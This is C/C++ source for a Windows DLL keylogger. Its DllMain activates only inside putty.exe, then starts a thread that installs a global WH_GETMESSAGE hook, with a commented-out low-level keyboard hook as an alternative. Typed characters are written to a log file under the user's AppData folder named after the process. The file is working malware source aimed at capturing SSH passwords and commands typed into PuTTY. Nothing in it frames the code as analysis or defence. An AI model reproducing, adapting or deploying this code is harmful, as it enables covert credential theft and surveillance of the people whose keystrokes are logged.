#include <Windows.h>
#include <Shlobj.h>
#include <stdio.h>

// hInstance of dll in process..
static HINSTANCE g_hInstance = NULL;
static HHOOK hkb = NULL;	// handler keyboard hook
static CHAR szLogName[MAX_PATH] = { 0 };	// filename..
static DWORD dwThreadKbd = 0;

static VOID LOG_Message(const char *text)
{
	FILE *f1 = fopen(szLogName, "a+");
	fprintf(f1, "%s", text);
	fclose(f1);
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam,
	LPARAM lParam)
{
	KBDLLHOOKSTRUCT  *pkStruct = (KBDLLHOOKSTRUCT *)lParam;

	char ch;
 	if (HC_ACTION == nCode)
 	{
		if ((wParam == VK_SPACE) || (wParam == VK_RETURN) || (wParam >= 0x2f) && (wParam <= 0x100))
		{
			FILE *f1 = fopen(szLogName, "a+");
			if (wParam == VK_RETURN)
			{
				ch = '\n';
				fwrite(&ch, 1, 1, f1);
			}
			else
			{
				BYTE ks[256];
				GetKeyboardState(ks);

				WORD w;
				UINT scan = MapVirtualKeyEx(pkStruct->vkCode, 0, NULL);
				ToAscii(pkStruct->vkCode, scan, ks, &w, 0);
				ch = char(w);
				fwrite(&ch, 1, 1, f1);
			}
			fclose(f1);
		}
	}

	LRESULT RetVal = CallNextHookEx(hkb, nCode, wParam, lParam);
	return  RetVal;
}

LRESULT CALLBACK MessageProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	OutputDebugStringA("MessageProc");
	if (HC_ACTION == nCode && PM_REMOVE == wParam)
	{
		MSG *msg = (MSG *)lParam;

		if (msg->message == WM_CHAR) {
			OutputDebugStringA("WM_CHAR event...");
			FILE *f1 = fopen(szLogName, "a+");
			char ch = char(msg->wParam);
			fwrite(&ch, 1, 1, f1);
			fclose(f1);
		}
	}

	return CallNextHookEx(hkb, nCode, wParam, lParam);
}
DWORD WINAPI KeyloggerThread(LPVOID lpParameter)
{
	if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, szLogName)))
	{
		char szFileName[MAX_PATH];
		char szProcessName[MAX_PATH];

		GetModuleFileNameA(NULL, szProcessName, sizeof(szProcessName));

		char *pName = strrchr(szProcessName, '\\');

		if (pName != NULL)
			pName++;

		char *dot = strchr(pName, '.');
		if (dot != NULL)
			*dot = 0x00;

		sprintf_s(szFileName, "\\%d_%s_%x.log", GetCurrentProcessId(), pName, GetTickCount());

		strcat_s(szLogName, szFileName);

		FILE *f1 = fopen(szLogName, "w+");
		fprintf(f1, "[kbdflt] %s\n", pName);
		fclose(f1);
	}

	//hkb = SetWindowsHookExA(WH_KEYBOARD_LL, (HOOKPROC)KeyboardProc, NULL, GetCurrentThreadId());
	hkb = SetWindowsHookExA(WH_GETMESSAGE, (HOOKPROC)MessageProc, (HINSTANCE) g_hInstance, 0);
	if (hkb == NULL)
	{
		OutputDebugStringA("Error in SetWindowsHookEx");
		LOG_Message("error in SetWindowsHookEx\n");
	}
	MSG msg;
	BOOL bRet;

	while (1)
	{
		bRet = GetMessage(&msg, NULL, 0, 0);

		if (bRet > 0)
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
		else if (bRet < 0)
		{
			// ??
		}
		else
		{
			break;
		}
	}

	UnhookWindowsHookEx(hkb);

	return 0;
}

static BOOL CheckHostProcess()
{
	char szCurrentProcess[MAX_PATH] = { 0 };

	GetModuleFileNameA(NULL, szCurrentProcess, MAX_PATH);

	char *szName = strrchr(szCurrentProcess, '\\');
	szName++;

	if (lstrcmpiA(szName, "putty.exe") == 0)
		return TRUE;

	return FALSE;

}
BOOL WINAPI DllMain(_In_ HINSTANCE hInstance, _In_ DWORD fdwReason, _In_ LPVOID lpvReserved)
{
	BOOL bRet = TRUE;

	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		if (CheckHostProcess() == FALSE)
		{
			bRet = FALSE;
		}
		else
		{
			OutputDebugStringA("Loaded");
			DisableThreadLibraryCalls((HMODULE)hInstance);
			g_hInstance = hInstance;
			CreateThread(NULL, 0, &KeyloggerThread, NULL, 0, &dwThreadKbd);
		}
		break;
	case DLL_PROCESS_DETACH:
		PostThreadMessage(dwThreadKbd, WM_QUIT, 0, 0);
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	default:
		break;
	}

	return TRUE;
}
